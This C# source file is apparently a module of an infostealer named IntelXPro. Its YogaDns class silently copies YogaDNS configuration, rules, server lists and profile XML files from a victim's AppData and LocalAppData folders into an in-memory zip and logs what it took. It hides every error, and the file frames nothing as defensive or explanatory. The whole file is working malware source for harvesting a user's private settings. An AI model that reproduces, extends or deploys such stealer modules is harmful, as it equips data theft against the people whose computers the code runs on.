using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class YogaDns : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "YogaDNS");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "YogaDNS");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "YogaDns";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "config.xml",
                    "settings.xml",
                    "rules.xml",
                    "servers.xml"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\YogaDns\\{location}\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string profilesPath = Path.Combine(basePath, "Profiles");
                if (Directory.Exists(profilesPath))
                {
                    string[] profileFiles = Directory.GetFiles(profilesPath, "*.xml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in profileFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\YogaDns\\{location}\\Profiles\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
